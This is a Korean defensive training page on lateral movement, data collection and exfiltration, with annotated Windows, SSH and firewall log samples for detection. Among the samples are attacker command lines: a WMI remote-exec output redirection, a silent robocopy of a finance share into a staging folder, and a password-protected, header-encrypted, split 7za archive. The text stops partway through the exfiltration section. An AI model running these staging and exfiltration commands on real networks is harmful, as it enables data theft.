---
title: "옆으로 이동, 수집, 유출 — 발판 하나에서 데이터가 문밖으로 나가기까지"
tags:
  - training
  - blue-team
  - endpoint
  - lateral-movement
  - exfiltration
---

# 옆으로 이동, 수집, 유출 — 발판 하나에서 데이터가 문밖으로 나가기까지 { #lateral-collection-exfil }

!!! abstract "이 페이지에서 다루는 것"
    침투의 마지막 구간입니다. 처음 뚫린 기계에 값나가는 데이터가 있는 경우는 거의 없어서, 공격자는 <strong>옆으로 이동(lateral movement)</strong>합니다. 새 호스트마다 두 가지가 필요합니다. 들어갈 방법(익스플로잇, 또는 훨씬 흔하게는 훔친 자격 증명)과 거기서 돌릴 코드(기본 내장 도구, 또는 미리 갖다 놓은 악성코드)입니다. 공격자가 빌려 쓰는 원격 관리 프로토콜(PsExec 방식의 서비스를 쓰는 SMB, WMI, PowerShell 원격, SSH, RDP, VNC)과, 각각이 <em>대상</em> 호스트에 남기는 이벤트를 정확히 봅니다. 그다음 **수집(collection)** — 파일과 공유 폴더, 이메일, 데이터베이스 뒤지기, 화면 캡처와 키로깅 — 그리고 옆으로 이동·권한 상승·수집이 왜 고리처럼 되풀이되는지. 그다음 **유출(exfiltration)**. 생각보다 어렵습니다. 기가바이트 단위 데이터가 (제대로 됐다면) 서버의 인터넷 접속을 막는 네트워크를 빠져나가야 하니까요. 그래서 데이터는 밖으로 나갈 수 있는 호스트에 모아지고, 압축·암호화·조각내기를 거쳐, 허용된 포트로 천천히 새어 나갑니다. 모든 샘플(원격 서비스에 대한 4624 유형 3·5145 `ADMIN$`·7045, `WmiPrvSE.exe`와 `wsmprovhost.exe`의 자식 프로세스, RDP 1149와 유형 10, SSH `auth.log` 한 줄, 공유 폴더 접근 몰아치기, `7z` 명령줄, 방화벽 차단 로그, Zeek `conn.log` 업로드, 느린 클라우드 동기화 명령줄)을 칸 단위로 풀어 봅니다. 끝으로 엔드포인트 공격 섹션 전체를 정리하고 확인 문제를 풉니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP, 파일 이름은 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. 공격자가 처음부터 목표 지점에 떨어지는 일은 드뭅니다. 원하는 데이터는 깊숙한 곳에 있고 권한 높은 계정으로만 닿습니다. 그래서 첫 호스트를 <strong>발판(foothold)</strong>으로 삼아 기계에서 기계로 건너갑니다. 이게 <strong>옆으로 이동(Lateral Movement, TA0008)</strong>입니다.
2. 한 번 건너갈 때마다 **재료 두 가지**가 필요합니다. 다음 호스트에 대한 **접근**(익스플로잇 — **T1210** — 또는 훨씬 흔하게는 훔친 유효한 자격 증명 — **T1078**)과 거기서 돌릴 **코드**(운영체제 기본 도구는 준비할 게 없고, 직접 만든 악성코드는 먼저 복사하거나 공유 폴더에 둬야 함 — **T1570 Lateral Tool Transfer**).
3. 공격자는 **우리 관리자들이 쓰는 원격 관리 프로토콜을 똑같이** 씁니다. 명령줄이면 원격 서비스를 쓰는 SMB(PsExec 방식), WMI, PowerShell 원격/WinRM, SSH, 화면이 필요하면 RDP, VNC, X11 포워딩. ATT&CK에서는 **T1021 Remote Services**(WMI는 **T1047**)입니다. 프로토콜 자체는 정상입니다. 수상한 건 **누가, 어디서, 어디로** 갔느냐입니다.
4. 옆으로 이동을 가장 잘 보는 곳은 **대상** 호스트입니다. 네트워크 로그온(4624 유형 3)이나 RDP 로그온(유형 10)이 있고, 몇 초 안에 티 나는 **부모 프로세스**(`services.exe`, `WmiPrvSE.exe`, `wsmprovhost.exe`)가 셸을 띄웁니다. PsExec 방식 도구라면 새 서비스(7045)도 생깁니다.
5. <strong>수집(Collection, TA0009)</strong>은 닿는 호스트마다 일어납니다. 로컬과 공유 폴더의 파일, 이메일, 데이터베이스, 화면, 키 입력을 모은 뒤, 중요한 걸 **스테이징(staging, 반출 대기)** 폴더에 복사합니다(**T1074 Data Staged**). 옆으로 이동, 권한 상승, 수집은 공격자가 원하는 걸 손에 넣을 때까지 **고리처럼** 되풀이됩니다.
6. <strong>유출(Exfiltration, TA0010)</strong>은 공격자에게 가장 어려운 부분입니다. 데이터는 많고, 서버는 인터넷에 못 나가고, 나가는 방향 방화벽을 통과해야 하고, 감시도 피해야 합니다. 그래서 밖으로 나갈 수 있는 호스트에 데이터를 **모아 두고**, **압축·암호화·조각내기**를 한 뒤(**T1560.001**), 작은 조각으로 **천천히** 보냅니다(**T1030**, **T1029**).
7. 암호화하면 패킷을 전부 잡아도 <em>무엇이</em> 털렸는지 숨겨집니다. 그래서 압축 도구의 **명령줄**(프로세스 생성 로그)이 어떤 파일이 나갔는지 보여 주는 유일한 기록일 수 있고, 때로는 비밀번호까지 들어 있습니다.
8. <strong>나가는 방향 기본 차단(default-deny outbound)</strong>이 잘 된 네트워크라면, 공격자는 빠져나갈 길을 찾다가 대개 **방화벽 차단 로그**를 남깁니다. 결국 **허용된 포트에서 원래 쓰이는 프로토콜**(프록시를 거친 HTTPS)을 써야 하고, 그때 탐지는 **목적지**와 업로드의 **양과 시간대**에 달려 있습니다.

## 옆으로 이동 { #lateral }

### 왜 첫 호스트로는 부족한가 { #why }

큰 사무실 건물에 1층 창문으로 들어온 도둑을 떠올려 보세요. 금고는 12층, 관리자 출입증이 있어야 열리는 방에 있습니다. 창문 덕분에 건물 <em>안에는</em> 들어왔지만, 값나가는 걸 만지려면 아직 복도를 걷고, 출입증을 빌리고, 엘리베이터를 타야 합니다.

표적 침투도 똑같습니다. 첫 피해자는 보통 피싱 메일을 연 사람이나 버그가 있던 인터넷 공개 서버입니다. 일반 사용자 노트북, DMZ의 웹 서버 같은 곳이죠. 진짜 목표 — 재무 파일 서버, 고객 데이터베이스, 도메인 컨트롤러, 백업 시스템 — 는 더 안쪽에 있고 **권한 높은 계정**으로만 닿습니다. 그래서 공격자는 첫 호스트를 **발판**으로 붙잡아 두고, 거기서 다음 기계, 또 다음 기계로 넘어가며 자격 증명과 권한을 주워 모읍니다. ATT&CK은 이걸 <strong>옆으로 이동(Lateral Movement, TA0008)</strong>이라고 부릅니다.

앞 페이지들이 여기서 이어집니다. 권한 상승으로 호스트 한 대의 관리자가 되고, 자격 증명 덤프로 그걸 <em>다른 사람의</em> 계정으로 바꾸고, 옆으로 이동에서 그 계정들을 새 호스트에 **써 버리는** 겁니다.

### 재료 두 가지: 접근과 코드 { #ingredients }

원격 기계에서 무언가를 하려면 공격자에게는 서로 다른 두 가지가 필요합니다.

| 재료 | 얻는 방법 | ATT&CK |
| --- | --- | --- |
| 원격 호스트에 대한 **접근** | 네트워크 서비스에 대한 익스플로잇(예: 패치 안 된 SMB나 RDP 취약점) | T1210 Exploitation of Remote Services |
| | **정상 자격 증명** — 훔친 비밀번호, 해시, 티켓(압도적으로 흔함) | T1078 Valid Accounts, T1550 Use Alternate Authentication Material |
| 거기서 돌릴 **코드** | 기본 명령(`cmd`, PowerShell, `net`, `reg`, `wmic` 등) — 가져올 게 없음 | (여러 가지, 예: T1059) |
| | 자기 악성코드나 도구 — 호스트에 복사하거나, 그 호스트가 닿는 공유 폴더에 둠 | T1570 Lateral Tool Transfer |

도구를 호스트에 복사할 때 공격자는 **아무도 안 보는 곳**을 좋아합니다. 임시 폴더, `C:\ProgramData`, `C:\Users\Public`, 그리고 **휴지통**(`C:\$Recycle.Bin\<SID>\`)까지요. 휴지통은 숨김 폴더이고 시스템 폴더처럼 보이니까요. 이런 경로에 다른 기계에서 SMB로 파일이 써지면 전형적인 신호입니다.

```
Event ID: 11   File created
UtcTime:        2026-11-18 03:41:09.220
Image:          System
TargetFilename: C:\$Recycle.Bin\S-1-5-21-1111111111-2222222222-3333333333-1104\$RX2K9QF.exe
User:           NT AUTHORITY\SYSTEM
```

- `Event ID 11` — Sysmon "파일 생성".
- `Image System` — 파일을 쓴 게 **커널의 SMB 서버**(`System` 프로세스, PID 4)라는 뜻입니다. 즉 이 파일은 로컬 프로그램이 아니라 다른 기계에서 **네트워크로** 들어왔습니다.
- `TargetFilename C:\$Recycle.Bin\…\$RX2K9QF.exe` — 사용자 휴지통 폴더 안의 **실행 파일**. 진짜로 지운 파일도 `$R…` 이름에 원래 확장자로 바뀌어 들어가긴 하지만, SMB로 휴지통에 `.exe`를 <em>배달하는</em> 정상 프로그램은 없습니다.

### 공격자가 빌려 쓰는 프로토콜 { #protocols }

불편한 진실이 있습니다. 옆으로 이동은 **쉽습니다**. 모든 운영체제에 한 기계에서 다른 기계를 조종하는 좋은 도구가 기본으로 들어 있기 때문입니다. 관리자가 서버마다 걸어가지 않아도 되게 만든 건데, 맞는 자격 증명만 있으면 누구에게나 똑같이 잘 동작합니다.

| 필요한 것 | 프로토콜/방법 | 포트 | ATT&CK | 대상 호스트에서 보이는 모습 |
| --- | --- | --- | --- | --- |
| 명령줄 | SMB + 원격 서비스(PsExec 방식) | TCP 445 | T1021.002 + T1569.002 | 4624 유형 3 → 5145 `ADMIN$` → 7045 새 서비스 → `services.exe`가 페이로드 실행 |
| 명령줄 | WMI | TCP 135 + 동적 상위 포트 | T1047 | 4624 유형 3 → `WmiPrvSE.exe`가 `cmd.exe`/`powershell.exe` 실행 |
| 명령줄 | PowerShell 원격 / WinRM | TCP 5985/5986 | T1021.006 | 4624 유형 3 → `wsmprovhost.exe`가 명령 실행 |
| 명령줄 | SSH | TCP 22 | T1021.004 | `auth.log`/저널의 `sshd` "Accepted …", Windows OpenSSH는 자체 로그 |
| 화면 | RDP | TCP/UDP 3389 | T1021.001 | 1149, 4624 유형 10, `rdpclip.exe`, 새 데스크톱 세션 |
| 화면 | VNC | TCP 5900+ | T1021.005 | VNC 서버 자체 로그. Windows 로그온 이벤트가 **아예 없는** 경우가 많음 |
| 화면 | X11 포워딩(리눅스) | SSH 위 | T1021.004 | X11 포워딩을 요청한 SSH 세션 |

각 프로토콜의 네트워크 쪽 모습은 [SMB](../other-protocols/smb.md), [SSH, RDP, VNC](../other-protocols/ssh-rdp-vnc.md), [PowerShell 원격, FTP, ICMP](../other-protocols/psremoting-ftp-icmp.md)에서 다뤘습니다. 여기서는 **대상 호스트**가 무엇을 기록하는지 봅니다.

### 대상에서: SMB + 원격 서비스(PsExec 방식) { #psexec }

PsExec 방식은 세 단계입니다. SMB로 로그인하고, 숨겨진 관리 공유 `ADMIN$`(= `C:\Windows`)에 프로그램을 복사하고, 원격 서비스 제어 관리자(Service Control Manager)에게 그 프로그램을 돌리는 서비스를 만들어 시작해 달라고 합니다. 단계마다 대상에 이벤트가 남습니다.

```
EventID:                   4624
Computer:                  FS-FIN-02.corp.example
LogonType:                 3
TargetUserName:            c.ito
TargetDomainName:          CORP
LogonProcessName:          NtLmSsp
AuthenticationPackageName: NTLM
WorkstationName:           SRV-APP-07
IpAddress:                 10.20.4.37
TargetLogonId:             0x9A41C2
```

- `4624` — "계정 로그온 성공". **로그온을 받는 쪽** 기계에서 생깁니다.
- `LogonType 3` — **네트워크** 로그온. 사용자가 자리에 앉거나 RDP 한 게 아니라, 무언가가 서비스(여기서는 SMB)에 접속한 겁니다.
- `TargetUserName c.ito` — 쓰인 계정. 이 사람이 애플리케이션 서버에서 재무 파일 서버를 만질 일이 있나요?
- `AuthenticationPackageName NTLM` — Kerberos가 아니라 NTLM. 도메인 기계끼리라면 한 번 더 볼 만합니다(pass-the-hash는 NTLM을 강제합니다 — [자격 증명 덤프](credential-dumping-mimikatz.md#use) 참고).
- `WorkstationName SRV-APP-07` / `IpAddress 10.20.4.37` — 건너온 **출발지**.
- `TargetLogonId 0x9A41C2` — 세션 ID. 이 세션에서 뒤따르는 이벤트에 같은 값이 붙으니, 이걸로 줄줄이 엮을 수 있습니다.

```
EventID:            5145
Computer:           FS-FIN-02.corp.example
SubjectUserName:    c.ito
SubjectLogonId:     0x9A41C2
ShareName:          \\*\ADMIN$
ShareLocalPath:     \??\C:\Windows
RelativeTargetName: svcupd.exe
AccessMask:         0x2
IpAddress:          10.20.4.37
```

- `5145` — "클라이언트에게 원하는 접근 권한을 줄 수 있는지 네트워크 공유 개체를 검사함". **상세 파일 공유(Detailed File Share)** 감사를 켜야만 생깁니다(양이 많아서 안 켠 곳이 많으니 우리 환경을 확인하세요).
- `SubjectLogonId 0x9A41C2` — 위 4624와 같은 세션.
- `ShareName \\*\ADMIN$` / `ShareLocalPath C:\Windows` — 숨겨진 **관리 공유**. 일반 사용자는 여기에 절대 쓰지 않습니다.
- `RelativeTargetName svcupd.exe` — `C:\Windows`에 써지는 파일.
- `AccessMask 0x2` — `WriteData`. 읽기만 하는 게 아니라 파일을 **쓰고** 있습니다.

```
Log Name:     System
Source:       Service Control Manager
EventID:      7045
Service Name: svcupd
Image Path:   %SystemRoot%\svcupd.exe
Service Type: user mode service
Start Type:   demand start
Account Name: LocalSystem
```

- `7045` — "시스템에 서비스가 설치됨"(System 로그). Security 로그 쪽 짝은 **4697**이고, "보안 시스템 확장(Security System Extension)" 감사를 켜야 나옵니다.
- `Image Path %SystemRoot%\svcupd.exe` — 방금 `ADMIN$`로 떨어진 그 파일. 진짜 PsExec 도구는 `PSEXESVC`라는 서비스 이름을 쓰지만, 복제품과 공격 프레임워크는 **무작위거나 무해해 보이는 이름**을 씁니다. 이름에 기대지 마세요.
- `Start Type demand start` + `Account Name LocalSystem` — 요청할 때 시작하고, **SYSTEM**으로 돕니다. 몇 초 전에 SMB로 들어온 파일을 가리키는, 갓 생긴 요청 시작형 SYSTEM 서비스. 이게 PsExec의 지문입니다.

그다음 **4688/Sysmon 1**에 `services.exe` → `svcupd.exe` → `cmd.exe`가 보입니다. 네 가지를 시간과 로그온 ID로 나란히 놓으면 건너간 게 증명됩니다. 더 자세히는 [SMB를 통한 PsExec](../../../adversary/psexec-smb.md).

### 대상에서: WMI와 PowerShell 원격 { #wmi-winrm }

WMI는 파일 복사도, 서비스도 없습니다. 대상의 WMI 공급자 호스트가 그냥 명령을 띄웁니다.

```
EventID:            4688
Computer:           FS-FIN-02.corp.example
SubjectUserName:    c.ito
NewProcessName:     C:\Windows\System32\cmd.exe
CommandLine:        cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1763437302.41 2>&1
ParentProcessName:  C:\Windows\System32\wbem\WmiPrvSE.exe
```

- `ParentProcessName …\WmiPrvSE.exe` — WMI 공급자 호스트. 서버에서 이게 정상적으로 셸을 띄우는 일은 아주 드뭅니다. <strong>`WmiPrvSE.exe` → `cmd.exe`/`powershell.exe`</strong>가 WMI 옆으로 이동의 모양입니다(**T1047**).
- `CommandLine cmd.exe /Q /c whoami` — `/Q`는 화면 출력(echo)을 끄고, `/c`는 명령 하나를 실행하고 끝냅니다.
- `1> \\127.0.0.1\ADMIN$\__1763437302.41 2>&1` — 결과를 **자기 자신**(`127.0.0.1`)의 `ADMIN$` 안 파일에 써서, 원격 공격자가 SMB로 읽어 가게 합니다. `ADMIN$` 아래 타임스탬프 같은 파일 이름은 흔한 공격 도구 모음의 잘 알려진 패턴입니다.

PowerShell 원격은 대상의 호스트 프로세스 안에서 명령을 돌립니다.

```
EventID:            4688
NewProcessName:     C:\Windows\System32\wsmprovhost.exe
CommandLine:        C:\Windows\system32\wsmprovhost.exe -Embedding
ParentProcessName:  C:\Windows\System32\svchost.exe
SubjectUserName:    c.ito
```

- `wsmprovhost.exe` — WinRM 플러그인 호스트. **원격 PowerShell 세션 하나에 하나씩** 생깁니다. 이게 띄우는 모든 것과 이 안에서 도는 모든 스크립트 블록(PowerShell **4104**, [실행, 지속성, 정보 탐색](execution-persistence-discovery.md) 참고)은 원격 사용자의 것입니다. 대상의 `Microsoft-Windows-WinRM/Operational` 로그에도 세션 생성이 남습니다. 더 자세히는 [WMI와 WinRM](../../../adversary/wmi-winrm.md).

### 대상에서: RDP와 SSH { #rdp-ssh }

RDP는 두 곳에 이벤트를 남깁니다.

```
Log Name:  Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational
EventID:   1149
User:      c.ito
Domain:    CORP
Source Network Address: 10.20.4.37
```

```
EventID:          4624
LogonType:        10
TargetUserName:   c.ito
IpAddress:        10.20.4.37
LogonProcessName: User32
```

- `1149` — "원격 데스크톱 서비스: 사용자 인증 성공". **네트워크 연결**이 인증된 걸 출발지 주소와 함께 기록합니다. Security 로그가 덮어써져 사라졌을 때도 쓸모가 있습니다.
- `4624 LogonType 10` — **RemoteInteractive**, 완전한 데스크톱 세션. (네트워크 수준 인증(NLA)을 쓰는 요즘 Windows에서는 바로 앞에 유형 3이 함께 보이기도 합니다.) 유형 10이라는 건 이 사용자의 자격 증명이 이제 **이 호스트 메모리에** 있다는 뜻입니다. 다음 덤프를 기다리면서요. 앞 페이지의 사슬 그대로입니다.

리눅스에서 SSH 로그인은 `/var/log/auth.log`(Debian/Ubuntu)나 `/var/log/secure`(RHEL 계열)에, 새 시스템에서는 systemd 저널에만 남기도 합니다.

```
Nov 18 03:52:14 db-cust-01 sshd[48211]: Accepted publickey for svc_backup from 10.20.4.37 port 51522 ssh2: ED25519 SHA256:k3Vq...redacted
```

- `Nov 18 03:52:14` — 로컬 시각(연도도 시간대도 없음 — syslog의 고전적인 한계).
- `db-cust-01` — 기록한 호스트. `sshd[48211]` — SSH 데몬 프로세스와 그 PID.
- `Accepted publickey` — 비밀번호가 아니라 **키**로 로그인 성공. 뚫린 사용자의 `~/.ssh/`에서 개인 키를 찾은 공격자가 딱 이렇게 씁니다.
- `for svc_backup from 10.20.4.37 port 51522` — 계정과 출발지. 백업 서비스 계정이 새벽 3시 52분에 애플리케이션 서버에서 들어왔다면 그게 실마리입니다.
- `ED25519 SHA256:k3Vq…` — 쓰인 **키의 지문(fingerprint)**. `authorized_keys`와 맞춰 보면 어떤 키 — 즉 어디서 훔친 사본 — 가 쓰였는지 알 수 있습니다.

!!! tip "[보충] 가장 단순한 옆으로 이동 탐지: 평소 누가 누구와 이야기하나"
    대부분의 네트워크에서 **PC는 다른 PC에 로그온하지 않고**, 일반 사용자는 서버에 RDP 하지 않습니다. 관리자는 정해진 관리용 기계나 점프 호스트에서 접속합니다. 그래서 "출발 호스트 → 도착 호스트 → 계정 → 로그온 유형"의 평소 모습(기준선, baseline)만 있어도 많이 잡힙니다. 사용자 노트북 두 대 사이의 4624 유형 3이나 10, 몇 분 안에 많은 호스트에 로그온하는 계정(퍼져 나가기, fan-out), 권한 높은 계정의 새 출발지. 네트워크 쪽에서도 Zeek `conn.log`나 흐름 데이터로 같은 걸 할 수 있습니다. 출발지별·시간별로 445, 135, 5985, 3389, 22 포트의 서로 다른 내부 목적지 수를 세면 됩니다.

## 수집 { #collection }

### 무엇을 모으나 { #what-collected }

새 호스트에 닿을 때마다 공격자는 쓸 만한 걸 뒤집니다. 자격 증명을 더, 지식재산, 개인정보, 재무 기록, 또는 그냥 다음 단계에 도움이 되는 정보. ATT&CK의 **수집(Collection, TA0009)** 전술에 흔한 대상이 정리돼 있습니다.

| 무엇 | ATT&CK | 흔한 증거 |
| --- | --- | --- |
| 호스트의 파일 | T1005 Data from Local System | 파일 읽기 몰아치기(그 폴더를 감사하면 4663, EDR 파일 이벤트), `dir /s`, `findstr` 검색 |
| 공유 폴더의 파일 | T1039 Data from Network Shared Drive | 파일 서버에서 한 계정·한 출발지의 **5145/5140** 몰아치기 |
| 화면 / 영상 | T1113 Screen Capture, T1125 Video Capture | 화면 캡처 API를 불러오는 이상한 프로세스, 임시 폴더에 생기는 이미지 파일 |
| 키 입력 | T1056.001 Keylogging | 키보드 입력을 가로채는 코드, 꾸준히 커지는 작은 로그 파일 |
| 이메일 | T1114 Email Collection | 사서함 내보내기, 디스크의 PST 파일, 클라우드 감사 로그의 이상한 사서함 접근 |
| 데이터베이스 / 저장소 | T1213 Data from Information Repositories(그리고 T1005) | `sqlcmd`/`bcp`/`mysqldump` 명령줄, 아주 큰 쿼리 결과 |
| 내보낼 준비 | T1074 Data Staged(.001 로컬, .002 원격), T1560 Archive Collected Data | `ProgramData`, `Temp`, `Public`이나 "스테이징" 호스트에 나타나는 큰 압축 파일 |

얼마나 모을 수 있는지는 기계마다 쥔 계정의 **권한**에 달려 있습니다. 그래서 단계들이 고리처럼 돕니다.

```
   lateral movement --> privilege escalation --> credential dumping
          ^                                             |
          |                                             v
          +------------------- collection <-------------+
                  (until the target data is reached, then: stage -> exfiltrate)
```

옆으로 이동 → 권한 상승 → 자격 증명 덤프 → 수집 → 다시 옆으로 이동. 목표 데이터에 닿으면 그때 모아 두고(stage) 빼냅니다(exfiltrate).

### 파일 서버의 수집 몰아치기 { #share-burst }

사람은 공유 폴더에서 파일 몇 개를 엽니다. 수집 스크립트는 폴더 트리 전체를 훑습니다. 공유 감사가 켜져 있으면 파일 서버에서 그 차이가 보입니다.

```
03:58:02  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\payroll_q3.xlsx            0x1 (ReadData)
03:58:02  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\payroll_q3_draft.xlsx      0x1 (ReadData)
03:58:03  5145  c.ito  10.20.4.37  \\*\Finance  2026\Q3\bank_details.csv           0x1 (ReadData)
...       (3,914 more in 6 minutes)
04:04:11  5145  c.ito  10.20.4.37  \\*\Finance  Archive\2019\audit\ledger.xlsx     0x1 (ReadData)
```

- 칸 순서: 시각, 이벤트 ID, 계정, 출발지 IP, 공유 이름, 상대 경로, 접근 마스크.
- **같은 계정, 같은 출발지, 몇 분 사이에 파일 수천 개, 최신 폴더에서 옛 보관 폴더까지 훑어 내려감** — 사람은 그렇게 읽지 않습니다. 전부 `0x1`(`ReadData`)이라는 건 파일을 **통째로 읽는다**, 즉 복사하고 있다는 뜻입니다.
- 출발지 `10.20.4.37`은 `SRV-APP-07` — 앞에서 건너온 그 호스트. 수집은 흔히 <em>발판에서</em> 네트워크 너머로 돌립니다.

엔드포인트 쪽에서 보면 대개 스테이징 폴더로의 복사 명령 한 줄입니다.

```
EventID:           4688
Computer:          SRV-APP-07.corp.example
SubjectUserName:   c.ito
NewProcessName:    C:\Windows\System32\Robocopy.exe
CommandLine:       robocopy \\FS-FIN-02\Finance C:\ProgramData\cache\f /E /MT:4 /R:0 /W:0 /NFL /NDL /NJH
ParentProcessName: C:\Windows\System32\cmd.exe
```

- `robocopy \\FS-FIN-02\Finance C:\ProgramData\cache\f` — Finance 공유 전체를 `ProgramData` 아래 평범해 보이는 폴더로 복사(**T1039** + **T1074.001**).
- `/E` — 하위 폴더 전부 포함. `/MT:4` — 스레드 4개(더 빠르게). `/R:0 /W:0` — 잠긴 파일은 다시 시도하지 않고 기다리지도 않음.
- `/NFL /NDL /NJH` — **파일 목록 없음, 폴더 목록 없음, 작업 머리말 없음**. <em>무엇을</em> 복사했는지 보여 줄 출력을 감춥니다. 조용히 하라는 옵션은 스크립트로 하는 도둑질의 전형입니다.

## 유출 { #exfil }

### 왜 데이터를 빼내는 게 읽는 것보다 어려운가 { #why-hard }

데이터베이스를 읽는 것과, 그 사본을 들고 건물 밖으로 나가는 건 전혀 다른 일입니다. 12층의 도둑은 금고 속 서류를 전부 <em>볼</em> 수는 있지만, 서류 상자 40개를 들고 로비를 지나가는 건 또 다른 문제입니다.

공격자가 넘어야 할 제약은 이렇습니다.

1. **양.** 값진 데이터는 대개 큽니다. 기가바이트, 테라바이트.
2. **서버는 인터넷에 못 나갑니다.** 제대로 된 환경은 내부 서버가 인터넷과 직접 이야기하지 못하게 막습니다. 그래서 데이터가 있는 자리에서 바로 보낼 수 없습니다.
3. **그래서 먼저 안에서 옮겨야 합니다.** 밖으로 나갈 수 *있는* PC나 서버, 즉 **스테이징** 호스트로 복사합니다. 이 내부 이동 자체도 탐지할 수 있습니다.
4. **열린 출구가 필요합니다.** 경계 방화벽을 통과하는, 허용된 목적지·포트·프로토콜.
5. **내용을 숨기고 싶어 합니다.** 전송이 들키더라도 무엇을 가져갔는지 모르게.
6. **천천히 가야 합니다.** 흐름 데이터(NetFlow)의 "업로드 상위" 목록에 오르거나, IDS·DLP·방화벽 기준치에 걸리지 않으려고.

### 전형적인 순서 { #sequence }

```
                                   Internet
                                       ^
                                       |  (4) many small encrypted pieces,
                                       |      slowly, through an allowed path
   +-----------------+   (2) access    |
   |  DB server      |<---------+      |
   | (no internet)   |          |      |
   +--------+--------+   +------+------+------+
            |            |  Infected host     |  (1) attacker has interactive
            +----------->|  (foothold, C2)    |      C2 on this machine
          (3) copy of    +--------------------+
              the data staged here
```

1. **대화형 제어.** 공격자는 피해 기계로 이어지는 명령·제어(C2) 채널이 살아 있고, 데이터에 닿을 자격 증명이나 익스플로잇을 가졌습니다.
2. 그 기계에서 **데이터에 접근** — Windows 파일 공유, SSH 세션, 데이터베이스 클라이언트 등 닿는 방법이면 무엇이든.
3. 제어하는 기계(또는 인터넷에 닿는 다른 기계)로 **사본을 모아 둡니다**. 이 단계는 데이터베이스 서버가 인터넷에 직접 **못** 나가기 때문에 생깁니다.
4. **준비하고 보냅니다.** 압축·암호화·조각내기를 한 뒤 천천히 흘려보냅니다.

### 압축, 암호화, 조각내기 — 그리고 명령줄이 중요한 이유 { #archive }

비밀번호와 분할 압축을 지원하는 압축 도구는 세 가지를 한꺼번에 해 줍니다(**T1560.001 Archive via Utility**).

```
EventID:           4688
Computer:          SRV-APP-07.corp.example
SubjectUserName:   c.ito
NewProcessName:    C:\ProgramData\cache\7za.exe
CommandLine:       7za.exe a -t7z -mx9 -mhe=on -p[redacted] -v95m C:\ProgramData\cache\upd.7z C:\ProgramData\cache\f\*
ParentProcessName: C:\Windows\System32\cmd.exe
```

- `C:\ProgramData\cache\`의 `7za.exe` — 유명한 압축 프로그램의 단독 실행형 명령줄 판입니다. 거기 설치된 게 아니라 **공격자가 들여온** 것입니다.
- `a` — 압축 파일에 파일을 **추가(add)**. `-t7z` — 7z 형식.
- `-mx9` — 최대 압축. 전체 크기가 작을수록 몰래 내보낼 바이트가 줄어듭니다.
- `-mhe=on` — **머리글(header)도 암호화**해서 압축 파일 안의 **파일 이름**까지 숨깁니다. 이게 없으면 압축 파일을 잡았을 때 안에 무슨 파일이 있는지는 보입니다.
- `-p[redacted]` — 압축 비밀번호. 실제 로그에서는 명령줄에 **그대로 평문으로** 보입니다. 나중에 조각들을 되찾으면 이 비밀번호로 열어서 무엇이 털렸는지 정확히 알 수도 있습니다.
- `-v95m` — **95MB 단위로 쪼개기**(`upd.7z.001`, `upd.7z.002`, …). 하나씩 보낼 만큼 작고, 흔한 업로드 크기 경보 아래입니다.
- `…\f\*` — 입력. 앞의 `robocopy`가 채운 스테이징 폴더.

공격자가 굳이 이러는 이유:

- **작게**: 압축하면 데이터가 줄어 보낼 바이트도, 전송 시간도 줄어듭니다.
- **조각**: 거대한 전송 한 번이 아니라, 조각마다 평범한 업로드처럼 보입니다.
- **내용 숨기기**: 네트워크에서 패킷을 전부 잡아도 암호화된 덩어리만 보입니다. <strong>무엇이 나갔는지 알려 주는 유일한 기록이 이 명령줄 한 줄</strong>(그리고 그게 읽은 파일)일 수 있습니다. 모든 곳에서 *명령줄 포함* 프로세스 생성 로그를 켜야 하는 강력한 이유입니다 — 꼭 알아야 할 이벤트 섹션에서 자세히 다룹니다.

### 빠져나갈 길 찾기 { #way-out }

암호화한 조각에도 출구가 필요합니다. 목적지(IP나 도메인), 목적지 포트, 애플리케이션 프로토콜. **나가는 방향 기본 차단** 정책이 있는 네트워크라면 — 안타깝게도 모든 조직이 그렇진 않지만 — 대부분의 선택지는 이미 닫혀 있습니다.

경계 방화벽이 이것만 허용한다고 해 봅시다.

- TCP **25**(SMTP) — 그것도 **메일 서버**에서만,
- TCP **80/443**(HTTP/HTTPS) — 그것도 **웹 프록시**에서만.

스테이징 호스트에서 공격자는 먼저 이걸 알아내야 하고, 대개 이것저것 해 보다가 **차단 로그**를 남깁니다.

```
2026-11-18T04:20:51Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50112 dst=203.0.113.50 dport=22  rule=default-deny-out
2026-11-18T04:20:52Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50113 dst=203.0.113.50 dport=21  rule=default-deny-out
2026-11-18T04:20:52Z fw-edge-01 action=deny proto=tcp src=10.20.4.37 sport=50114 dst=203.0.113.50 dport=443 rule=default-deny-out
2026-11-18T04:20:53Z fw-edge-01 action=deny proto=udp src=10.20.4.37 sport=50115 dst=203.0.113.50 dport=53  rule=default-deny-out
```

- `action=deny` … `rule=default-deny-out` — "명시적으로 허용하지 않은 건 모두 막기" 기본 규칙이 걸렸습니다.
- `src=10.20.4.37` — **내부 서버**가 인터넷에 **직접** 붙으려 합니다. 서버는 그러면 안 됩니다. 그래서 막힌 겁니다.
- `dst=203.0.113.50`에 `dport` 22, 21, 443, 53을 1초 간격으로 — 같은 외부 호스트에 **여러 포트를 연달아** 시도했습니다. 누군가 열린 길을 더듬고 있는 겁니다. 443조차 막힌 건 프록시만 쓸 수 있기 때문입니다.

이런 연속 차단은 우리가 얻을 수 있는 **가장 싸고 이른 유출 신호** 중 하나입니다. 나가는 방향 차단에 아예 경보를 안 거는 SOC가 많은데, 적어도 내부 서버가 만든 차단에는 경보를 걸어야 합니다.

프록시만 밖에 나간다는 걸 알게 되면, 공격자는 **허용된 포트에서 원래 쓰는 프로토콜**을 씁니다. 프록시를 거친 HTTPS로, 클라우드 저장소나 파일 공유 사이트나 자기 서버로. 이제 내용 검사는 거의 도움이 안 됩니다(TLS인 데다 안의 데이터도 이미 암호화돼 있으니까요). 남는 건 이것들입니다.

